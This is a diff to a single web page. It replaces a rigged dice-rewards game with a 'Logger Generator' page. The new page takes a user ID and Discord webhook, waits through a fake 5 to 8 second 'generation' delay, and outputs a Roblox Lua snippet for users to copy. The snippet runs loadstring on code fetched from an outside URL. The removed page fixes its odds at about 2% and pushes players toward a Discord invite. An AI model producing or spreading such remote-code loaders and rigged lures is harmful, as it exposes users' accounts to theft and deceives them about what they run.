@@ -1,177 +1,156 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="utf-8" />
-<meta name="viewport" content="width=device-width,initial-scale=1" />
-<title>Dice Rewards</title>
-<style>
-:root{--bg1:#0f172a;--bg2:#04263a;--accent:#7c3aed;--green:#10b981;--red:#ef4444}
-*{box-sizing:border-box;user-select:none}
-html,body{height:100%;margin:0;font-family:Inter,ui-sans-serif,system-ui,-apple-system,'Segoe UI',Roboto,'Helvetica Neue',Arial}
-body{background: radial-gradient(1200px 800px at 10% 20%, rgba(124,58,237,0.14), transparent),radial-gradient(900px 600px at 90% 80%, rgba(3,105,161,0.12), transparent),linear-gradient(180deg,var(--bg1),var(--bg2));display:flex;align-items:center;justify-content:center;padding:32px;color:#e6eef8;}
-.card{width:min(720px,96vw);background: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));border-radius:20px;padding:28px;box-shadow:0 10px 30px rgba(2,6,23,0.6);display:grid;grid-template-columns:360px 1fr;gap:20px;align-items:center;backdrop-filter: blur(6px);}
-.scene{display:flex;flex-direction:column;align-items:center;gap:18px}
-.die{width:220px;height:220px;border-radius:22px;background:linear-gradient(145deg,#0b1220 0%, #0f172a 100%);display:grid;grid-template-columns:repeat(3,1fr);grid-template-rows:repeat(3,1fr);padding:18px;gap:6px;position:relative;transform-origin:center;transition:transform 600ms cubic-bezier(.2,.9,.3,1), filter 300ms;box-shadow: inset 0 6px 18px rgba(255,255,255,0.02), 0 12px 30px rgba(2,6,23,0.6);border:1px solid rgba(255,255,255,0.03);}
-.die.rolling{animation: shake 700ms ease-in-out infinite; filter: drop-shadow(0 20px 30px rgba(0,0,0,0.45));}
-@keyframes shake{0%{transform: rotate3d(1,1,0,0deg) translateY(0) scale(1)}25%{transform: rotate3d(1,1,0,10deg) translateY(-6px) scale(1.02)}50%{transform: rotate3d(1,0,1,-8deg) translateY(0) scale(0.98)}75%{transform: rotate3d(0,1,1,12deg) translateY(-4px) scale(1.01)}100%{transform: rotate3d(1,1,0,0deg) translateY(0) scale(1)}}
-.pip{width:28px;height:28px;border-radius:50%;background:linear-gradient(180deg,#fff 0%,#e6e6e6 100%);display:block;margin:auto;box-shadow: 0 6px 10px rgba(2,6,23,0.5);opacity:0;transform:scale(0.6);transition:opacity 180ms, transform 220ms;}
-.face-1 .pip[data-pos="c"]{opacity:1;transform:scale(1)}
-.face-2 .pip[data-pos="tl"],.face-2 .pip[data-pos="br"]{opacity:1;transform:scale(1)}
-.face-3 .pip[data-pos="tl"],.face-3 .pip[data-pos="c"],.face-3 .pip[data-pos="br"]{opacity:1;transform:scale(1)}
-.face-4 .pip[data-pos="tl"],.face-4 .pip[data-pos="tr"],.face-4 .pip[data-pos="bl"],.face-4 .pip[data-pos="br"]{opacity:1;transform:scale(1)}
-.face-5 .pip[data-pos="tl"],.face-5 .pip[data-pos="tr"],.face-5 .pip[data-pos="c"],.face-5 .pip[data-pos="bl"],.face-5 .pip[data-pos="br"]{opacity:1;transform:scale(1)}
-.face-6 .pip[data-pos="tl"],.face-6 .pip[data-pos="ml"],.face-6 .pip[data-pos="bl"],.face-6 .pip[data-pos="tr"],.face-6 .pip[data-pos="mr"],.face-6 .pip[data-pos="br"]{opacity:1;transform:scale(1)}
-.cell{display:flex;align-items:center;justify-content:center}
-.controls{display:flex;flex-direction:column;gap:12px;align-items:center}
-.btn{background: linear-gradient(180deg, rgba(255,255,255,0.03), rgba(255,255,255,0.02));border-radius:12px;padding:12px 20px;border:1px solid rgba(255,255,255,0.04);cursor:pointer;font-weight:600;letter-spacing:0.2px;box-shadow:0 6px 18px rgba(2,6,23,0.45);transition:transform 180ms, box-shadow 180ms;}
-.btn:active{transform:translateY(2px) scale(0.995)}
-.btn.primary{background:linear-gradient(90deg,var(--accent),#0ea5b0);color:white}
-.status{font-size:18px;font-weight:700}
-.message{font-size:14px;opacity:0.9}
-.win{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;flex-direction:column;pointer-events:none}
-.win .banner{background: linear-gradient(90deg, rgba(124,58,237,0.95), rgba(14,165,176,0.95));padding:16px 28px;border-radius:999px;font-size:22px;font-weight:800;color:white;box-shadow:0 10px 30px rgba(14,165,176,0.12);transform: translateY(-20px) scale(0.9);opacity:0;transition:transform 420ms cubic-bezier(.2,.9,.25,1), opacity 320ms;}
-.win.show .banner{transform: translateY(0) scale(1);opacity:1}
-.confetti{position:absolute;inset:0;pointer-events:none;overflow:hidden}
-.confetti .piece{position:absolute;width:10px;height:14px;opacity:0;transform-origin:center;animation: fall 1400ms linear forwards}
-@keyframes fall{0%{opacity:1;transform: translateY(-10vh) rotateZ(0) translateX(0) scale(1)}100%{opacity:1;transform: translateY(110vh) rotateZ(540deg) translateX(80px) scale(1)}}
-.overlay{position:fixed;inset:0;background:rgba(0,0,0,0.5);display:flex;align-items:center;justify-content:center;backdrop-filter:blur(5px);z-index:20;display:none}
-.popup{background:#0b1220;padding:28px;border-radius:16px;text-align:center;max-width:320px}
-.popup h3{margin-top:0;margin-bottom:12px;font-size:20px}
-.popup p{margin:0 0 16px;font-size:14px}
-.popup .btn{margin:0 8px}
-body.blur .card{filter:blur(5px)}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Logger Generator</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&family=Fira+Code:wght@400;500&display=swap');
+        
+        body {
+            background-color: #0a0a0c;
+            font-family: 'Inter', sans-serif;
+            color: #e2e8f0;
+            cursor: default !important;
+        }
+
+        .pop-in {
+            animation: popIn 0.5s cubic-bezier(0.26, 0.53, 0.74, 1.48) forwards;
+        }
+
+        @keyframes popIn {
+            0% { opacity: 0; transform: scale(0.9) translateY(20px); }
+            100% { opacity: 1; transform: scale(1) translateY(0); }
+        }
+
+        .purple-glow {
+            box-shadow: 0 0 25px rgba(139, 92, 246, 0.1);
+        }
+
+        input {
+            background: #16161e;
+            border: 1px solid #2d2d3d;
+            cursor: default !important;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #8b5cf6;
+            box-shadow: 0 0 0 2px rgba(139, 92, 246, 0.2);
+        }
+
+        .loader {
+            border: 2px solid #2d2d3d;
+            border-top: 2px solid #8b5cf6;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        button {
+            cursor: default !important;
+            transition: all 0.2s ease;
+        }
+
+        #outputCode {
+            scrollbar-width: thin;
+            scrollbar-color: #2d2d3d #050507;
+        }
+    </style>
 </head>
-<body>
-<div class="card">
-  <div class="scene">
-    <div style="position:relative">
-      <div id="die" class="die face-1">
-        <div class="cell"> <span class="pip" data-pos="tl"></span> </div>
-        <div class="cell"> <span class="pip" data-pos="c"></span> </div>
-        <div class="cell"> <span class="pip" data-pos="tr"></span> </div>
-        <div class="cell"> <span class="pip" data-pos="ml"></span> </div>
-        <div class="cell"> <span class="pip" data-pos="mr"></span> </div>
-        <div class="cell"> <span class="pip" data-pos="bl"></span> </div>
-        <div class="cell"> <span class="pip" data-pos="c"></span> </div>
-        <div class="cell"> <span class="pip" data-pos="br"></span> </div>
-        <div class="cell"> <span class="pip" data-pos="c"></span> </div>
-      </div>
-      <div id="win" class="win" aria-hidden="true">
-        <div class="confetti" id="confetti"></div>
-        <div class="banner">YOU WON! 🎉</div>
-      </div>
+<body class="min-h-screen flex items-center justify-center p-6">
+
+    <div class="pop-in w-full max-w-md bg-[#11111a] p-8 rounded-2xl border border-[#2d2d3d] purple-glow">
+        <h1 class="text-2xl font-bold text-white mb-6 text-center tracking-tight">Logger Generator</h1>
+        
+        <div class="space-y-4">
+            <div>
+                <label class="block text-sm font-medium text-gray-400 mb-1">User ID</label>
+                <input type="text" id="userId" placeholder="Enter ID..." class="w-full p-3 rounded-lg text-white">
+            </div>
+
+            <div>
+                <label class="block text-sm font-medium text-gray-400 mb-1">Webhook (not required)</label>
+                <input type="text" id="webhook" placeholder="Discord Webhook URL..." class="w-full p-3 rounded-lg text-white">
+            </div>
+
+            <div class="flex items-center gap-4 pt-2">
+                <button id="generateBtn" onclick="generate()" class="flex-1 bg-violet-600 hover:bg-violet-700 text-white font-bold py-3 rounded-lg">
+                    GENERATE
+                </button>
+                <div id="loading" class="hidden loader"></div>
+            </div>
+        </div>
+
+        <div id="resultBox" class="hidden mt-8 pt-6 border-t border-[#2d2d3d] pop-in">
+            <div class="flex items-center justify-between mb-3">
+                <h2 class="text-lg font-semibold text-white">Generated!</h2>
+                <button id="copyBtn" onclick="copyToClipboard()" class="p-2 hover:bg-[#1d1d2b] rounded-md text-gray-400 hover:text-white">
+                    <i id="copyIcon" data-lucide="copy" class="w-5 h-5"></i>
+                </button>
+            </div>
+            <div class="relative">
+                <pre id="outputCode" class="bg-[#050507] p-4 rounded-lg text-[11px] font-mono text-violet-300 overflow-x-auto border border-[#1e1e2e] leading-relaxed"></pre>
+            </div>
+        </div>
     </div>
-    <div class="controls">
-      <button id="rollBtn" class="btn primary">Roll</button>
-      <div class="status" id="status">Ready to roll</div>
-    </div>
-  </div>
-</div>
 
-<div class="overlay" id="overlay">
-  <div class="popup">
-    <h3>Are you in the Discord?</h3>
-    <p>If you are not in the Discord server, if you win, you will not get ur prize.</p>
-    <button id="yesBtn" class="btn" style="background:var(--green)">Yes</button>
-    <button id="noBtn" class="btn" style="background:var(--red)">No</button>
-  </div>
-</div>
+    <script>
+        // Initialize Icons
+        lucide.createIcons();
 
-<script>
-(function(){
-  const die = document.getElementById('die');
-  const btn = document.getElementById('rollBtn');
-  const win = document.getElementById('win');
-  const confetti = document.getElementById('confetti');
-  const overlay = document.getElementById('overlay');
-  const yesBtn = document.getElementById('yesBtn');
-  const noBtn = document.getElementById('noBtn');
-  const status = document.getElementById('status');
-  let rolling = false;
+        function generate() {
+            const btn = document.getElementById('generateBtn');
+            const loader = document.getElementById('loading');
+            const resultBox = document.getElementById('resultBox');
+            const output = document.getElementById('outputCode');
 
-  function randInt(min,max){return Math.floor(Math.random()*(max-min+1))+min;}
-  function clearConfetti(){while(confetti.firstChild) confetti.removeChild(confetti.firstChild);}
-  function spawnConfetti(){
-    clearConfetti();
-    const colours=['#7c3aed','#06b6d4','#f59e0b','#ef4444','#10b981','#60a5fa'];
-    for(let i=0;i<36;i++){
-      const el=document.createElement('div');
-      el.className='piece';
-      el.style.width=randInt(6,12)+'px';
-      el.style.height=randInt(10,18)+'px';
-      el.style.left=(Math.random()*100)+'%';
-      el.style.background=colours[i%colours.length];
-      el.style.transform=`translateY(-20vh) rotate(${randInt(0,360)}deg)`;
-      el.style.animationDuration=(1200+Math.random()*800)+'ms';
-      el.style.animationDelay=(Math.random()*120)+'ms';
-      confetti.appendChild(el);
-    }
-  }
+            const userId = document.getElementById('userId').value || "";
+            const webhook = document.getElementById('webhook').value || "";
 
-  function setFace(n){die.className='die face-'+n;}
+            resultBox.classList.add('hidden');
+            loader.classList.remove('hidden');
+            btn.style.opacity = "0.5";
 
-  async function roll(){
-    if(rolling) return;
-    rolling=true;
-    win.classList.remove('show'); win.setAttribute('aria-hidden','true'); clearConfetti();
-    die.classList.add('rolling');
-    const flickerCount = randInt(8,14);
-    for(let i=0;i<flickerCount;i++){ setFace(randInt(1,5)); await new Promise(r=>setTimeout(r,60+Math.random()*80)); }
-    await new Promise(r=>setTimeout(r,120));
-    const final = Math.random()<0.02?6:randInt(1,5);
-    setFace(final); die.classList.remove('rolling');
-    if(final===6){ spawnConfetti(); setTimeout(()=>{ win.classList.add('show'); win.setAttribute('aria-hidden','false'); },120); setTimeout(clearConfetti,2400);}
-    rolling=false;
-  }
+            // Random delay 5-8 seconds
+            const delay = Math.floor(Math.random() * (8000 - 5000 + 1)) + 5000;
 
-  // Cooldown
-  function updateCooldown(){
-    const next = parseInt(localStorage.getItem('nextRollTime')||'0');
-    const now = Date.now();
-    if(now<next){
-      btn.disabled=true;
-      const diff = next-now;
-      const h=Math.floor(diff/3600000);
-      const m=Math.floor((diff%3600000)/60000);
-      const s=Math.floor((diff%60000)/1000);
-      status.textContent=`You can try again in ${h}h ${m}m ${s}s`;
-    }else{
-      btn.disabled=false;
-      status.textContent='Ready to roll';
-    }
-  }
+            setTimeout(() => {
+                const script = `getgenv().SkibidiLogger_USERID = "${userId}" -- your user id here
+getgenv().SkibidiLogger_WEBHOOK = "${webhook}" -- your discord webhook here, blank if you don't want to get messages
 
-  function startCooldown(){
-    const next = Date.now()+3600000;
-    localStorage.setItem('nextRollTime',next);
-    updateCooldown();
-  }
+loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/18291063f87ad7562ffd1bdccac707dfd91e417f4df57478192ca9f2286bb626/download"))()`;
 
-  setInterval(updateCooldown,1000);
+                output.textContent = script;
+                loader.classList.add('hidden');
+                resultBox.classList.remove('hidden');
+                btn.style.opacity = "1";
+            }, delay);
+        }
 
-  // Popup logic
-  btn.addEventListener('click',()=>{
-    overlay.style.display='flex';
-    document.body.classList.add('blur');
-  });
+        function copyToClipboard() {
+            const text = document.getElementById('outputCode').textContent;
+            const copyIcon = document.getElementById('copyIcon');
+            
+            navigator.clipboard.writeText(text).then(() => {
+                // Change icon to checkmark
+                copyIcon.setAttribute('data-lucide', 'check');
+                copyIcon.classList.add('text-green-400');
+                lucide.createIcons();
 
-  yesBtn.addEventListener('click', ()=>{
-    overlay.style.display='none';
-    document.body.classList.remove('blur');
-    roll();
-    startCooldown();
-  });
-
-  noBtn.addEventListener('click', ()=>{
-    window.open('https://discord.gg/jsgrQUW6eA','_blank');
-  });
-
-  document.addEventListener('keydown', (e)=>{
-    if(e.code==='Space'||e.code==='Enter'){ e.preventDefault(); btn.click(); }
-  });
-
-})();
-</script>
+                // Revert back after 2 seconds
+                setTimeout(() => {
+                    copyIcon.setAttribute('data-lucide', 'copy');
+                    copyIcon.classList.remove('text-green-400');
+                    lucide.createIcons();
+                }, 2000);
+            });
+        }
+    </script>
 </body>
 </html>
